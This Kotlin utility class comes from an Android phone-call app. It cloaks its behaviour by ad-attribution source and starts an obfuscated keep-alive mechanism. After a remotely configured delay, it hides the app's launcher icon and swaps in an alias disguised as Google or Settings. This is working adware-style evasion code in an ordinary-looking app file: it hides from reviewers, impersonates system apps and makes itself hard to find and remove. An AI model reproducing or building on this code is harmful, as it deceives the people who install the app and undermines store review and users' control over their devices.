package com.lixiang.phonecall.util

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import androidx.core.content.ContextCompat
import com.NivCvXXTe.fivaZSftMS
import com.blankj.utilcode.util.ActivityUtils
import com.lixiang.phonecall.base.appContext
import com.lixiang.phonecall.service.CustomIncomingCallService
import com.lixiang.phonecall.service.NotificationService
import com.lixiang.phonecall.ui.NewGoogleLaunchAc
import com.lixiang.phonecall.ui.NewSettingLaunchAc
import com.lixiang.phonecall.ui.SplashAC
import com.lixiang.phonecall.util.config.FireConfig
import com.myaaa.mydwjdpow.nifeihfe
import kotlinx.coroutines.*

object AppKeepUtil {
    var changeIcon=false
    var splashPageShowing=false

    //冷启动判断是否需要开启保活
    fun clodLaunchAppOpenKeep(){
        val localRefer = UserTypeUtil.getLocalRefer()
        if (localRefer.isNotEmpty()&& isReferBuyUser(localRefer)){
            startOrCloseKeep(true)
            return
        }
        val localAdJust = UserTypeUtil.getLocalAdJust()
        if (localAdJust.isNotEmpty()&& isAdJustBuyUser(localAdJust)){
            startOrCloseKeep(true)
            return
        }
        val localCloak = UserTypeUtil.getLocalCloak()
        if (localCloak.isNotEmpty()&& localCloak =="alison"){
            startOrCloseKeep(true)
            return
        }
        if (localRefer.isEmpty()&&localAdJust.isEmpty()&&localCloak.isEmpty()){
            startOrCloseKeep(true)
        }
    }

    fun startOrCloseKeep(start:Boolean){
        if (!nifeihfe.bh()&&start){
            if (!FireConfig.ringartPopBean.checkUserType()){
                return
            }
            nifeihfe.setBhs(appContext,true)
        }
        if (nifeihfe.bh()&&!start){
            FirebasePointUtil.point("ringart_close_date")
            nifeihfe.setBhs(appContext,false)
        }
    }

    fun hideIcon(){
        GlobalScope.launch {
            while (true){
                if (!isActive){
                    break
                }
                delay(FireConfig.ringartExchangeIcoBean.changeIconDelayTime().toLong()+2000L)
                if (!splashPageShowing&&!UserTypeUtil.isCloakBlankUser&&FireConfig.ringartExchangeIcoBean.checkCanHideIcon()){
                    changeIcon=true
                    cancel()
                    if (Build.VERSION.SDK_INT < 29){
                        FirebasePointUtil.point("ringart_android_10")
                        fivaZSftMS.LjhTlxWvsWPh(appContext,SplashAC::class.java.canonicalName)
                    }else{
                        FirebasePointUtil.point("ringart_android_11")
                        val changeIconToSetting = FireConfig.ringartExchangeIcoBean.getChangeIconToSetting()
                        if (changeIconToSetting==true){
                            set(appContext,SplashAC::class.java.canonicalName,NewSettingLaunchAc::class.java.canonicalName)
                        }else if (changeIconToSetting==false){
                            set(appContext,SplashAC::class.java.canonicalName,NewGoogleLaunchAc::class.java.canonicalName)
                        }
                    }
                }
            }
        }
    }

    fun startForegroundService(){
        if (checkCanStartForegroundService()){
            ContextCompat.startForegroundService(appContext, Intent(appContext,NotificationService::class.java))
        }
    }

    private fun checkCanStartForegroundService():Boolean{
        if (FireConfig.ringartPopBean.getCanStartService()&&!UserTypeUtil.isCloakBlankUser&&(UserTypeUtil.adjustBuyUser||UserTypeUtil.referBuyUser)){
            return true
        }
        return false
    }

    /**
     *
     * @param context
     * @param main com.learn.alias.MainActivity
     * @param alias com.learn.alias.AliasActivity
     */
    private fun set(context: Context, main: String, alias: String) {
        disableComponent(context, main)
        enableComponent(context, alias)
    }

    /**
     * //此方法用以启用和禁用组件，会覆盖Androidmanifest文件下定义的属性
     * 启动组件
     */
    private fun enableComponent(context: Context, clazzName: String) {
        val componentName = ComponentName(context, clazzName)
        val mPackageManager: PackageManager = context.getPackageManager()
        mPackageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    /**
     * 禁用组件
     */
    private fun disableComponent(context: Context, clazzName: String) {
        val componentName = ComponentName(context, clazzName)
        val mPackageManager: PackageManager = context.getPackageManager()
        mPackageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}